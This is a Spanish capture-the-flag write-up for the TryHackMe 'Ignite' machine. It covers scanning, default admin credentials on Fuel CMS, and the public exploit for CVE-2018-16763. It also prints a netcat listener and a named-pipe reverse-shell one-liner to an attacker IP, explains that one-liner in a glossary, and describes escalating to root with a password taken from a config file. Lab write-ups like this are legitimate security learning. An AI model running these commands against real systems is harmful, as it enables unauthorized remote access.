# Machine Ignite

## Informtion Gathering

1. Primero realizo un escaneo de puerto asi:

```
$ nmap -sV 10.10.169.195
``` 
2. El resultado es el siguiente:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

## Analisis de vulnerabilidades

- Voy a nessus a realizar un escaneo pero no hay nada util

- Luego ejecute dirb de esta manera
```
$ dirb http://10.10.169.195:80
```
- El resultado que me genero son varias URL y la mas importante es esta
```
http://10.10.169.195:80/robots.txt (CODE:200|SIZE:30)
```
- ya que contiene la URL del panel admin

## Exploiting

- Probe el puerto **80** y tenia como con una pagina del **Fuel CMS**
- las credenciales son **admin** para entrar al panel de administración
- Decido subir un **shell_reverse** y conectarme con **Netcat** pero no me funciono
- Decido buscar por internet un exploit para el **Fuel CMS** y encontre une de **Code Execute**
```
https://www.exploit-db.com/exploits/47138
```
- Luego lanzamos el exploit de esta manera
```
$ python reverse.py
```
- Ya con esto podemos usar el **shell** pero vamos a usar algo mas versatil
- Vamos a usar un **Netcat** para realizar una **shell**
```
$ nc -nlvp 1337
```
- Luego debemos buscamos una manera de enviar una shell a **Netcat**
- Para eso en el exploit que tenemos en **Python** vamos a ejecutar esto
```
"rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.35.145 1337 >/tmp/f"
```
- La direccion IP es la interfaz **tun0**
- Ya con esto tenemos una **Shell**
- En el usuario **www-data** se encuentra el la bandera **User.txt**
- Luego vamos a ir al archivo **fuel/application/config** para poder buscar el archivo **database.php**
- En ese archivo se encuantra la contraseña de **root**
- Luego vamos a correr el usuario de esta manera **sudo - root**
- Ya con esto podemos sacar el archivo **root.txt** 

## Glosario

**nc:**Llama a la aplicacion netcat

**-n:**no realice ninguna búsqueda de DNS o servicio

**-l:**escucha una conexión entrante en lugar de iniciar una conexión a un host remoto

**-v:**usa salida detallada

**-p:**especifica el puerto de origen que nc debería usar

**1337:**el puerto en el que nc escuchará las conexiones entrantes

**rm /tmp/f;**elimina cualquier directorio preexistente llamado **/tmp/f**, el punto y coma finaliza el comando similar a presionar la tecla ENTER, es decir que estamos borrando el archivo **f** dentro de el directorio de almacenamiento temporal

**mkfifo /tmp/f;** crea una tubería con nombre en la ubicación **/tmp/f** , el punto y coma termina el comando 

**cat /tmp/f |**muestra el contenido de **/tmp/f** y canaliza los resultados al siguiente comando 

**/bin/sh -i 2> & 1 |**invoca el binario de shell predeterminado, el **-i** le dice que use el modo interactivo, redirija stderr2 al mismo destino que stdout1 y canalice eso al siguiente comando 

**nc 10.8.6.159 1337 > /tmp/f**dile a netcat que se conecte a la IP y al PUERTO remotos y redirigir esa salida a la tubería nombrada

**tty**:

## Investigación

https://www.howtoforge.com/linux-mkfifo-command/

https://www.howtogeek.com/428174/what-is-a-tty-on-linux-and-how-to-use-the-tty-command/

## Explotación maquina Ignite

https://exploits.run/ignite/

https://unicornsec.com/home/tryhackme-ignite

https://blog.tryhackme.com/ignite-writeup/

https://www.embeddedhacker.com/2019/08/hacking-walkthrough-ignite-ctf/

https://nvd.nist.gov/vuln/detail/CVE-2018-16763
